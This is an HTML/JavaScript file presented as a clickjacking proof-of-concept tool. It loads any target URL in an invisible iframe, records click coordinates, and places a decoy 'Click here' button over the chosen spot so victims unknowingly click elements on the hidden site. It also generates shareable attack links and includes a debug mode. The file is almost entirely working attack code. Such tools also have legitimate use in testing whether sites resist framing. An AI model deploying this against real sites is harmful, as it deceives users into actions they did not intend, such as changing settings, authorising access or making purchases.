<html>
<head>
    <meta charset="utf-8">
    <title>clickjacking v2</title>
    <style type="text/css">
        #overlay {
            position: absolute;
            width: 100%;
            height: 100%;
            z-index: 0;
        }

        #fakeBtn {
            position: relative;
            top: 200px;
            left: 200px;
            visibility: hidden;
        }

        #target_frame {
            width: 2000px;
            height: 2000px;
            filter:alpha(opacity=0);
            opacity: 0;
            position: absolute;
            z-index: 1000;
            display: block;
        }
    </style>
    <script type="text/javascript">
    // author: ts
    // last-modified: 2014-09-22 14:40
    // hash: 05f995f332955a58ab3b035653b058e049fccfd314862101b42c6ee52122135af04de6526f13c529cab7aa40ed956c95c732260dd25c1a907d4f981e14d3d62b

    function get_params() {
        var url = window.location.search;
        var params = {};
        if(url.length > 1) {
            var re_name = /^(.+?)(\[(.*)\])?$/;
            url = url.substr(1).split('&');
            for(var i in url) {
                seg = url[i].split('=');
                var name = decodeURIComponent(seg[0].replace(/\+/g, '%20'));
                var value = decodeURIComponent(seg[1].replace(/\+/g, '%20'));
                name = name.match(re_name);
                if(name[2] == undefined) {
                    params[name[0]] = value;
                } else {
                    if (typeof params[name[1]] == 'undefined') {
                        params[name[1]] = new Array();
                    }
                    if (name[3] != "") {
                        params[name[1]][name[3]] = value;
                    } else {
                        params[name[1]][params[name[1]].length] = value;
                    }
                }
            }
        }
    
        return params;
    }

    function get_mouse(e) {
	var posx = 0;
	var posy = 0;
	if (!e) var e = window.event;
	if (e.pageX || e.pageY) 	{
		posx = e.pageX;
		posy = e.pageY;
	}
	else if (e.clientX || e.clientY) 	{
		posx = e.clientX + document.body.scrollLeft
			+ document.documentElement.scrollLeft;
		posy = e.clientY + document.body.scrollTop
			+ document.documentElement.scrollTop;
	}

        return {
            x: posx,
            y: posy
        }
    }

    var $ = function(id) { return document.getElementById(id); };
    var $$ = function(sel) { return document.querySelectorAll; };

    window.onload = function() {

        $('fakeBtn').onclick = function() { alert('Clickjacking failed :('); };
        var params = get_params();
        var url = params.url;
        var xpos = params.x;
        var ypos = params.y;
        var debug = params.debug
        var loaded = false;

        if(typeof url == 'undefined') {
            url = prompt("URL to clickjack");
            if(!url.match(/^http(s?):/)) {
                alert("Please enter a valid url (starting with http: or https:)");
                window.location.reload();
                return;
            }
            if(!url.match(new RegExp('^'+window.location.protocol))) {
                alert("Warning: target protocol doesn't match current protocol " + window.location.protocol + "\n" +
                      "Some browser may need to allow load unsafe resources");
            }
            $('target_frame').src = url;
            $('target_frame').style.opacity = 1;
            $('target_frame').style.zIndex = 0;
            $('target_frame').onload = function() {
                loaded = true;
            };
            $('overlay').innerHTML = '';
            $('overlay').style.height = window.getComputedStyle($('target_frame')).height;
            $('overlay').style.width = window.getComputedStyle($('target_frame')).width;
            $('overlay').style.zIndex = 1000;
            $('overlay').style.display = 'block';
            $('overlay').style.cursor = 'crosshair';
            $('overlay').onclick = function(e) {
                var mouse = get_mouse(e);
                document.write('<a href="' + window.location.href.replace(window.location.search, "") + '?url=' + encodeURIComponent(url) + '&x=' + mouse.x + '&y=' + mouse.y + '">Copy this link</a>&nbsp;');
                document.write('<a href="' + window.location.href.replace(window.location.search, "") + '?url=' + encodeURIComponent(url) + '&x=' + mouse.x + '&y=' + mouse.y + '&debug=on">Copy this link (Debug Mode)</a>');
            };

            setTimeout(function() { 
                if(loaded) {
                    alert('Target site loaded to fast. Maybe X-Frame-Options is present?');
                }
            }, 300);
        }
        else {
            $('target_frame').src = url;
            var rect = $('fakeBtn').getBoundingClientRect();
            $('target_frame').style.top = (rect.top + rect.bottom) / 2 - ypos;
            $('target_frame').style.left = (rect.left + rect.right) / 2 - xpos;
            if(typeof debug !== 'undefined')
                $('target_frame').style.opacity = 0.2;
            $('target_frame').onload = function() {
                $('fakeBtn').style.visibility = 'visible';
                $('target_frame').onload = function() {
                    $('target_frame').style.opacity = 0.5;
                    $('target_frame').style.top = '0px';
                    $('target_frame').style.left = '0px';
                };
            };
            $('target_frame').onerror = function() {
                alert("Couldn't load page " + url);
            }
        }
    }
    </script>
</head>
<body>
    <div id="overlay">
        <h1>Click jacking PoC Script</h1>
        <button id="fakeBtn">Click here</button>
    </div>
    <iframe id="target_frame" src="about:blank"></iframe>
</body>
</html>
